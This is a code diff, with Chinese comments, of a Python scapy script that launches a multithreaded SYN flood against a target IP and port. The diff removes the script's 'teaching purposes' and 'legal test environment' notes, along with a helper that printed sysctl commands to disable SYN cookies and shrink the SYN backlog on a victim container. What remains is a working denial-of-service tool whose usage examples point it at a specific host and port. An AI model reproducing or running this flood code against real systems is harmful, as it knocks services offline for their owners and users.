@@ -5,61 +5,6 @@ import subprocess
 import os
 from scapy.all import *
 
-def adjust_victim_tcp_params(target_ip, make_vulnerable=True):
-    """
-    调整目标系统的TCP参数以增强攻击效果（教学用途）
-    这需要在受害者容器中执行，或通过SSH等方式
-    """
-    print(f"{'=' * 60}")
-    if make_vulnerable:
-        print("🎯 调整TCP参数以增强SYN攻击效果")
-        print("   - 缩短SYN队列长度")
-        print("   - 延长SYN+ACK重试时间")
-        print("   - 关闭SYN Cookies防护")
-    else:
-        print("🛡️  恢复TCP参数到安全配置")
-    print(f"{'=' * 60}")
-    
-    if make_vulnerable:
-        # 使系统更容易受到SYN攻击的参数
-        vulnerable_params = {
-            'net.ipv4.tcp_max_syn_backlog': '128',      # 缩短SYN队列（默认通常是1024+）
-            'net.ipv4.tcp_synack_retries': '6',         # 延长SYN+ACK重试次数（增加等待时间）
-            'net.ipv4.tcp_syn_retries': '6',            # 延长SYN重试次数
-            'net.ipv4.tcp_syncookies': '0',             # 关闭SYN Cookies防护
-            'net.ipv4.tcp_abort_on_overflow': '1',      # 队列满时拒绝连接
-        }
-        print("📋 应用易受攻击的TCP参数:")
-    else:
-        # 恢复到默认参数（更真实）
-        vulnerable_params = {
-            'net.ipv4.tcp_max_syn_backlog': '1024',     # 系统默认SYN队列
-            'net.ipv4.tcp_synack_retries': '5',         # 系统默认重试次数
-            'net.ipv4.tcp_syn_retries': '6',            # 系统默认重试次数
-            'net.ipv4.tcp_syncookies': '1',             # 开启SYN Cookies防护
-            'net.ipv4.tcp_abort_on_overflow': '0',      # 系统默认处理方式
-        }
-        print("📋 恢复系统默认TCP参数:")
-    
-    # 生成sysctl命令
-    commands = []
-    for param, value in vulnerable_params.items():
-        commands.append(f"sysctl -w {param}={value}")
-        print(f"   {param} = {value}")
-    
-    print(f"\n💡 在受害者系统({target_ip})上执行以下命令:")
-    if make_vulnerable:
-        print("   docker exec -it victim bash")
-        print("   ./setup_victim.sh vulnerable")
-    else:
-        print("   docker exec -it victim bash")
-        print("   ./setup_victim.sh default    # 恢复系统默认")
-        print("   # 或者")
-        print("   ./setup_victim.sh secure     # 应用增强防护")
-    print()
-    
-    return commands
-
 def syn_flood_thread(target_ip, target_port, thread_id, packets_per_second=1000):
     """
     单线程SYN Flood攻击
@@ -155,29 +100,18 @@ def enhanced_syn_flood_thread(target_ip, target_port, thread_id, packets_per_sec
             print(f"⚠️  Thread {thread_id} error: {e}")
             time.sleep(0.01)
 
-def syn_flood(target_ip, target_port, num_threads=8, packets_per_second=2000, adjust_params=True):
+def syn_flood(target_ip, target_port, num_threads=8, packets_per_second=2000):
     """
     增强版多线程SYN Flood攻击
     :param target_ip: 目标IP
     :param target_port: 目标端口
     :param num_threads: 线程数量
     :param packets_per_second: 每秒发包数（每线程）
-    :param adjust_params: 是否显示参数调整建议
     """
     print(f"🎯 启动增强版SYN Flood攻击: {target_ip}:{target_port}")
     print(f"📊 攻击参数: {num_threads} 线程, 每线程 {packets_per_second} pps")
     print(f"📈 预期总速率: {num_threads * packets_per_second} pps")
     print()
-    
-    if adjust_params:
-        # 显示TCP参数调整建议
-        adjust_victim_tcp_params(target_ip, make_vulnerable=True)
-        
-        print("⏳ 等待5秒，给您时间调整受害者系统参数...")
-        for i in range(5, 0, -1):
-            print(f"   {i}秒后开始攻击...")
-            time.sleep(1)
-        print()
     
     threads = []
     try:
@@ -203,8 +137,6 @@ def syn_flood(target_ip, target_port, num_threads=8, packets_per_second=2000, ad
             
     except KeyboardInterrupt:
         print("\n🛑 正在停止所有攻击线程...")
-        print("💡 建议恢复受害者系统的TCP参数:")
-        adjust_victim_tcp_params(target_ip, make_vulnerable=False)
         # 线程会通过daemon=True自动停止
 
 def show_usage():
@@ -219,17 +151,12 @@ def show_usage():
     print("  Target_Port   目标端口")
     print("  --threads     攻击线程数 (默认: 8)")
     print("  --pps         每线程每秒包数 (默认: 2000)")
-    print("  --no-adjust   不显示TCP参数调整建议")
     print("  --legacy      使用原版攻击模式")
     print()
     print("示例:")
     print("  python3 attack.py 10.10.20.20 80")
     print("  python3 attack.py 10.10.20.20 80 --threads 12 --pps 3000")
-    print("  python3 attack.py 10.10.20.20 80 --legacy --threads 5 --pps 1000")
     print()
-    print("教学说明:")
-    print("  此工具会建议调整受害者系统的TCP参数以演示SYN攻击原理")
-    print("  请确保在合法的测试环境中使用")
 
 if __name__ == "__main__":
     if len(sys.argv) < 3:
@@ -243,7 +170,6 @@ if __name__ == "__main__":
     # 默认参数
     num_threads = 8
     pps_per_thread = 2000
-    adjust_params = True
     use_legacy = False
     
     # 解析可选参数
@@ -256,23 +182,10 @@ if __name__ == "__main__":
         elif arg == "--pps" and i + 1 < len(sys.argv):
             pps_per_thread = int(sys.argv[i + 1])
             i += 2
-        elif arg == "--no-adjust":
-            adjust_params = False
-            i += 1
-        elif arg == "--legacy":
-            use_legacy = True
-            i += 1
-        else:
-            # 兼容旧版本参数格式
-            if i == 3:
-                num_threads = int(arg)
-            elif i == 4:
-                pps_per_thread = int(arg)
-            i += 1
     
     # 启动攻击
     if use_legacy:
         print("🔄 使用原版攻击模式")
         syn_flood_thread(victim_ip, victim_port, 1, pps_per_thread)
     else:
-        syn_flood(victim_ip, victim_port, num_threads, pps_per_thread, adjust_params)
+        syn_flood(victim_ip, victim_port, num_threads, pps_per_thread)
